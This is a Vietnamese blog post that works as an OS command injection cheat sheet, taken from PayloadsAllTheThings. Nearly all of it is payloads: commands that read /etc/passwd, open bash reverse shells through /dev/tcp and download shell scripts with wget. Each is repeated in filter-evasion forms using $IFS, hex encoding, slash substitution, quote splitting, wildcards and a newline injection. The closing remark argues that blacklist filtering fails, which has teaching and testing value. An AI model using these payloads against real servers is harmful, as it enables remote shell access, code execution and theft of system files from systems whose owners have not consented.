![](https://images.viblo.asia/54aa9667-2535-4959-ad70-e66097fc2a03.jpg)

## 1. OS Command Injection là gì?

OS Command Injection (hay còn gọi là shell injection) là lỗ hổng cho phép kẻ tấn công thực thi các lệnh bất kì của hệ điều hành trên server chạy ứng dụng với đặc quyền của web server. Lỗ hổng xảy ra khi một ứng dụng gọi tới lệnh shell để thực thi một tác vụ với input do người dùng nhập vào nhưng không lọc một cách cẩn thận.

Lỗ hổng OS command injection có thể cho phép kẻ tấn công thực hiện các hành vi như:

* Thực thi lệnh hệ thống.
* Làm tổn hại tới ứng dụng, server chạy ứng dụng cũng như dữ liệu trên đó.
* Thực hiện SSRF.
* Remote Code Execution.

* ...

Để nắm rõ hơn về lỗ hổng , các bạn có thể tham khảo các bài viết tại [đây](https://viblo.asia/p/os-command-injection-la-gi-command-injection-co-nguy-hiem-khong-can-cuc-ky-than-trong-doi-voi-cac-lenh-os-goi-tu-website-cua-ban-OeVKB3PEZkW) [đây](https://viblo.asia/p/os-command-injection-Do754P4e5M6)  và  [đây](https://owasp.org/www-community/attacks/Command_Injection) 

## 2. Basic commands

Ở đây mình đưa ra 3 câu lệnh thường dùng sau khi đã phát hiện hệ thống kiểm thử bị ảnh hưởng bởi OS Command Injection 

1. Đọc file trên Server 
```
cat /etc/passwd
```

2. Reverse Shell 
```
bash -i >& /dev/tcp/127.0.0.1/8080 0>&1
```

3. Download reverse shell trên server
```
wget http://127.0.0.1:8080/x.sh -O /tmp/y.sh
```

## 3. Bypass without space

Trong trường hợp server ngăn chặn OS Commnad Injection bằng cách validate "dấu cách" . Chúng ta thực hiện bypass theo các cách sau :
1. Đọc file trên Server 

```bash script
* cat</etc/passwd

* (cat,/etc/passwd)

* cat${IFS}/etc/passwd

* X=$'cat\x20/etc/passwd'&&$X

* bash</etc/passwd

* IFS=,;$(cat<<<cat,/etc/passwd) (Chỉ hoạt động trên Bash Shell)
```

2. Reverse Shell

```bash script
* bash$IFS-i$IFS>&$IFS/dev/tcp/192.168.1.21/8080$IFS0>&1 

* echo${IFS}"RCE"${IFS}&&bash${IFS}-i${IFS}>&${IFS}/dev/tcp/127.0.0.1/8080$IFS0>&1

* sh</dev/tcp/127.0.0.1/8080

* IFS=,;`bash<<<bash,-i,>&/dev/tcp/127.0.0.1/8080;0>&1
```

3. Download reverse shell trên server

```bash script
* {wget,http://127.0.0.1:8080/x.sh,-O,/tmp/y.sh}

* wget${IFS}http://127.0.0.1:8080/x.sh${IFS}-O${IFS}/tmp/y.sh

* X=$'wget\x20http://127.0.0.1:8080/x.sh\x20-O\x20/tmp/y.sh'&&$X

* IFS=,;$(cat<<<wget,http://127.0.0.1:8080/x.sh,-O,/tmp/y.sh)
```


## 4. Bypass characters filter via hex encoding

1. Đọc file trên Server 

```bash script
* cat $(echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64")

* cat $(xxd -r -p <<< 2f6574632f706173737764)

* cat $(xxd -r -ps <(echo 2f6574632f706173737764))
```

  (Trong đó giá trị `\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x66` tương ứng với /etc/passwd sau khi được hex encoding)

2. Dowload reverse shell trên server 

```bash script
* $(xxd -r -p <<< 7767657420687474703a2f2f3132372e302e302e313a313231322f782e7368202d4f202f746d702f792e73680a)

* $(xxd -r -ps <(echo 7767657420687474703a2f2f3132372e302e302e313a313231322f782e7368202d4f202f746d702f792e73680a))

* $(echo -e "\x77\x67\x65\x74\x20\x68\x74\x74\x70\x3a\x2f\x2f\x31\x32\x37\x2e\x30\x2e\x30\x2e\x31\x3a\x31\x32\x31\x32\x2f\x78\x2e\x73\x68\x20\x2d\x4f\x20\x2f\x74\x6d\x70\x2f\x79\x2e\x73\x68\x0a")
```

(Trong đó giá trị  `7767657420687474703a2f2f3132372e302e302e313a313231322f782e7368202d4f202f746d702f792e73680a `tương ứng với "*wget http://127.0.0.1:1212/x.sh -O /tmp/y.sh*" sau khi được hex encoding)
  
## 5. Bypass without backslash and slash

Trong trường hợp server ngăn chặn OS Commnad Injection bằng cách validate dấu `"/"` và dấu` "\"` . Chúng ta thực hiện bypass theo các cách sau :

1. Đọc file trên Server 

```bash script
* cat ${HOME:0:1}etc${HOME:0:1}passwd

* cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
```

   (Trong đó giá trị ${HOME:0:1} và (echo . | tr '!-0' '"-1') thay cho  / )

2. Reverse Shell

```bash script
* bash -i >& ${HOME:0:1}dev${HOME:0:1}tcp${HOME:0:1}127.0.0.1${HOME:0:1}8080 0>&1

* bash -i >& $(echo . | tr '!-0' '"-1')dev$(echo . | tr '!-0' '"-1')tcp$(echo . | tr '!-0' '"-1')127.0.0.1$(echo . | tr '!-0' '"-1')8080 0>&1
```

3. Download file trên server
```bash script
* wget http:${HOME:0:1}${HOME:0:1}127.0.0.1:8080${HOME:0:1}x.sh -O ${HOME:0:1}tmp${HOME:0:1}y.sh

* wget http:$(echo . | tr '!-0' '"-1')$(echo . | tr '!-0' '"-1')127.0.0.1:8080$(echo . | tr '!-0' '"-1')x.sh -O $(echo . | tr '!-0' '"-1')tmp$(echo . | tr '!-0' '"-1')y.sh
```

## 6. Bypass Blacklisted words

Trong trường hợp server ngăn chặn OS Commnad Injection bằng cách không cho nhập các commnad thông thường như "cat , more , bash , wget .. " Chúng ta thực hiện bypass theo các cách sau :

1. Đọc file trên Server 

```
* c'a't /etc/passwd

* c"a"t /etc/passwd

* c\a\t /etc/passwd

* ca$@t /etc/passwd

* /???/c?t /etc/passwd

* /???/c?t /?tc/?as?wd
```

2. Reverse Shell

```
* b'a'sh -i >& /dev/tcp/127.0.0.1/8080 0>&1

* b"a"sh -i >& /dev/tcp/127.0.0.1/8080 0>&1

* b\a\s\h -i >& /dev/tcp/127.0.0.1/8080 0>&1

* ba$@sh -i >& /dev/tcp/127.0.0.1/8080 0>&1

* /???/b?sh -i >& /dev/tcp/127.0.0.1/8080 0>&1
```

3. Download file trên server
```

* w'ge't http://127.0.0.1:8080/x.sh -O /tmp/y.sh

* w"ge"t http://127.0.0.1:8080/x.sh -O /tmp/y.sh

* /???/?i?/w?et http://127.0.0.1:8080/x.sh -O /tmp/y.sh
```

## 7. Bypass with a line return

* `something%0Acat%20/etc/passwd`

## 8. Kết luận

Đến đây chúng ta có thể thấy được rằng, nếu cố gắng validate OS Command Injection theo Blacklist, sẽ có vô vàn các cách khác nhau để Hacker có thể vượt qua.

## 9. Nguồn

Nguồn tài liệu mình sử dụng tại [đây](https://github.com/swisskyrepo/PayloadsAllTheThings) . PayloadsAllTheThings là kho chứa rất nhiều kiến thức thú vị về bảo mật mà mình nghĩ bạn nên xem qua .